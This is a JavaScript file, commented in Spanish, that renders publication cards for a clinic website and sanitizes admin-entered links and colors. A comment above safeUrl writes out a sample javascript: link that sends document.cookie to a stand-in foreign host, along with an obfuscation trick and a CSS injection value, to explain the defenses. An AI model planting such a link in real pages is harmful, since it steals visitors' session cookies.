/**
 * ============================================================
 *  STUDIES.JS - Seccion "Studies & Work"
 * ============================================================
 *  De donde saca las publicaciones, en orden de prioridad:
 *
 *    1. De la tabla `posts` de Supabase (si esta conectado).
 *       Es la forma recomendada: el personal las agrega desde
 *       admin.html, arrastrando la foto, sin tocar codigo.
 *
 *    2. De un Google Sheet publicado como CSV, si se configuro
 *       SITE_CONFIG.studies.sheetCsvUrl. Alternativa por si se
 *       prefiere trabajar en una hoja de calculo.
 *
 *    3. De data/sample-studies.json, como respaldo, para que la
 *       seccion nunca se vea vacia.
 * ============================================================
 */

/**
 * main.js dispara "rdc:content-loaded" SIEMPRE (haya backend o no,
 * funcione o falle). Aqui solo esperamos ese aviso y decidimos:
 * si el admin tiene publicaciones las usamos, si no, respaldo.
 */
document.addEventListener("rdc:content-loaded", dibujarPublicaciones);

/* Al cambiar de idioma hay que repintar estas tarjetas: su titulo y
   su resumen vienen de la base con los dos idiomas dentro, y quien
   elige cual se ve es esta funcion, no RDC_I18N.

   Se repinta desde los MISMOS datos que ya estaban en memoria. No se
   vuelve a pedir nada al servidor: el visitante no espera y la
   clinica no gasta una peticion de su plan gratuito. */
document.addEventListener("rdc:lang-changed", dibujarPublicaciones);

function dibujarPublicaciones() {
  const fromAdmin = window.__RDC_STUDIES__;

  if (fromAdmin && fromAdmin.length) {
    renderStudies(document.getElementById("studiesGrid"), fromAdmin);
  } else {
    loadFallbackStudies();
  }
}


/** Cadena de respaldo: Google Sheet -> archivo local */
async function loadFallbackStudies() {
  const grid = document.getElementById("studiesGrid");
  if (!grid) return;

  const sheetUrl = SITE_CONFIG.studies.sheetCsvUrl;

  try {
    const posts = sheetUrl
      ? await fetchFromGoogleSheet(sheetUrl)
      : await fetchFromLocalFile();

    renderStudies(grid, posts);
  } catch (err) {
    console.warn("No se pudieron cargar las publicaciones:", err);
    try {
      renderStudies(grid, await fetchFromLocalFile());
    } catch {
      grid.innerHTML = `<p class="studies-empty">${escapeHtml(RDC_I18N.t("studies.empty"))}</p>`;
    }
  }
}

async function fetchFromLocalFile() {
  const res = await fetch("data/sample-studies.json");
  if (!res.ok) throw new Error("No se encontro el archivo de respaldo");
  return res.json();
}

async function fetchFromGoogleSheet(csvUrl) {
  const res = await fetch(csvUrl);
  if (!res.ok) throw new Error(`La hoja respondio ${res.status}`);
  return parseCsvToPosts(await res.text());
}


/* ----------------------------------------------------------------
   LECTOR DE CSV
   Pequeno a proposito: la salida de "publicar en la web" de Google
   Sheets es predecible, no hace falta una libreria completa.
   Igual maneja comas dentro de comillas.
   ---------------------------------------------------------------- */

function parseCsvToPosts(csvText) {
  const rows = csvText.trim().split(/\r?\n/).map(parseCsvLine);
  const headers = rows[0].map(h => h.trim().toLowerCase());

  return rows.slice(1)
    .filter(row => row.some(cell => cell.trim() !== ""))
    .map(row => {
      const post = {};
      headers.forEach((header, i) => { post[header] = (row[i] || "").trim(); });
      return post;
    })
    .sort((a, b) => new Date(b.date) - new Date(a.date)); // mas nuevas primero
}

function parseCsvLine(line) {
  const cells = [];
  let current = "";
  let inQuotes = false;

  for (let i = 0; i < line.length; i++) {
    const char = line[i];
    if (char === '"') {
      inQuotes = !inQuotes;
    } else if (char === "," && !inQuotes) {
      cells.push(current);
      current = "";
    } else {
      current += char;
    }
  }
  cells.push(current);
  return cells;
}


/* ----------------------------------------------------------------
   DIBUJAR LAS TARJETAS
   ---------------------------------------------------------------- */

function renderStudies(grid, posts) {
  if (!grid) return;

  if (!posts || !posts.length) {
    grid.innerHTML = `<p class="studies-empty">${escapeHtml(RDC_I18N.t("studies.empty"))}</p>`;
    return;
  }

  grid.innerHTML = posts.map(postToCardHtml).join("");

  // Enganchar las tarjetas nuevas a la animacion de aparicion.
  // Las tarjetas nacen con opacity:0 (clase .reveal), asi que si
  // por lo que sea no hay observador, hay que mostrarlas a mano.
  // De lo contrario quedarian invisibles para siempre.
  const observer = window.__RDC_OBSERVER__;
  const cards = grid.querySelectorAll(".reveal");

  if (observer) {
    cards.forEach(el => observer.observe(el));
  } else {
    cards.forEach(el => el.classList.add("in-view"));
  }
}

function postToCardHtml(post) {
  const color = post.color || "#2dd4bf";
  const dateLabel = formatDate(post.date);

  // Portada: la imagen de la publicacion si tiene; si no, la
  // imagen de relleno configurada; y si tampoco hay, un degradado
  // con el color elegido. Asi nunca queda un hueco vacio.
  const cover = post.image || SITE_CONFIG.studies.defaultImage;

  const coverSeguro = safeUrl(cover);

  const media = coverSeguro
    ? `<div class="study-card-media" style="background-image:url('${escapeAttr(coverSeguro)}')"></div>`
    : `<div class="study-card-media" style="background:linear-gradient(135deg, ${escapeAttr(safeColor(color))}, transparent)"></div>`;

  const card = `
    <article class="study-card reveal">
      ${media}
      <div class="study-card-body">
        <p class="study-card-date">${dateLabel}</p>
        <h3>${escapeHtml(RDC_I18N.pick(post.title) || RDC_I18N.t("studies.untitled"))}</h3>
        <p>${escapeHtml(RDC_I18N.pick(post.excerpt) || "")}</p>
      </div>
    </article>
  `;

  // El enlace pasa por safeUrl y no directo por escapeAttr. Escapar
  // las comillas impide romper el atributo, pero no impide que el
  // atributo entero valga `javascript:...`, que es codigo que se
  // ejecuta al hacer clic. Ver la nota larga en safeUrl().
  const enlace = safeUrl(post.link);

  return enlace
    ? `<a href="${escapeAttr(enlace)}" target="_blank" rel="noopener" class="study-link">${card}</a>`
    : card;
}

/* La fecha se escribe en el idioma activo: "16 de agosto de 2026" o
   "August 16, 2026". Se pasa el idioma a proposito en vez de dejar
   undefined, que usaria el del navegador y no el que el visitante
   acaba de elegir en el sitio. */
function formatDate(dateStr) {
  const d = new Date(dateStr);
  if (isNaN(d)) return dateStr || "";

  const locale = RDC_I18N.current() === "es" ? "es-ES" : "en-US";
  return d.toLocaleDateString(locale, { year: "numeric", month: "long", day: "numeric" });
}

/** Evita que texto del admin se interprete como HTML */
function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str == null ? "" : str;
  return div.innerHTML;
}

/**
 * Igual, pero para valores que van dentro de un atributo.
 *
 * El `&` va PRIMERO y no es un detalle de estilo: si se escapara al
 * final, convertiria en entidades los `&amp;` que acaban de crear
 * las otras reglas. Y escapar `&` importa de verdad, porque sin eso
 * un `&#106;avascript:` escrito a mano lo decodifica el navegador y
 * vuelve a ser `javascript:`.
 *
 * Se escapa tambien la comilla simple aunque los atributos de este
 * archivo vayan con comillas dobles: hay valores que caen dentro de
 * un `url('...')` en un style, y ahi la comilla simple es la que
 * delimita.
 */
function escapeAttr(str) {
  return String(str == null ? "" : str)
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

/**
 * Deja pasar solo direcciones que no ejecutan nada.
 *
 * ------------------------------------------------------------
 * POR QUE HACE FALTA, SI YA SE ESCAPAN LAS COMILLAS
 * ------------------------------------------------------------
 * Escapar comillas evita SALIR del atributo. No evita que el
 * contenido legitimo del atributo sea codigo:
 *
 *     <a href="javascript:fetch('https://sitio-ajeno/'+document.cookie)">
 *
 * Ahi no hay ni una comilla fuera de sitio. El HTML es perfecto.
 * Y al hacer clic, se ejecuta.
 *
 * Esa direccion sale del campo "Link" de una publicacion, que se
 * escribe desde el panel. O sea: hace falta ser personal de la
 * clinica para plantarlo — pero una vez plantado, lo ejecuta
 * CUALQUIER visitante de la portada que pinche la tarjeta. Una
 * cuenta del panel comprometida pasaria de "puede editar textos"
 * a "puede correr codigo en el navegador de los pacientes".
 *
 * Se limpian los caracteres de control antes de mirar el esquema
 * porque el navegador tambien los ignora: `java&#9;script:` es
 * `javascript:` para el, y seria `java\tscript:` para una
 * comprobacion ingenua.
 * ------------------------------------------------------------
 */
function safeUrl(url) {
  const limpio = String(url == null ? "" : url)
    .replace(/[\u0000-\u0020\u007f-\u009f]/g, "");

  if (!limpio) return "";

  // Sin esquema: ruta relativa o ancla. No hay nada que secuestrar.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(limpio)) return limpio;

  return /^(https?|mailto|tel):/i.test(limpio) ? limpio : "";
}

/**
 * El color va dentro de un `style`, donde escapar comillas no basta:
 * un `red;position:fixed;inset:0` taparia la pagina entera. Se
 * acepta solo lo que de verdad es un color.
 */
function safeColor(value) {
  const v = String(value == null ? "" : value).trim();
  return /^(#[0-9a-f]{3,8}|[a-z]+|rgba?\([\d\s.,%]+\)|hsla?\([\d\s.,%]+\))$/i.test(v)
    ? v
    : "#2dd4bf";
}
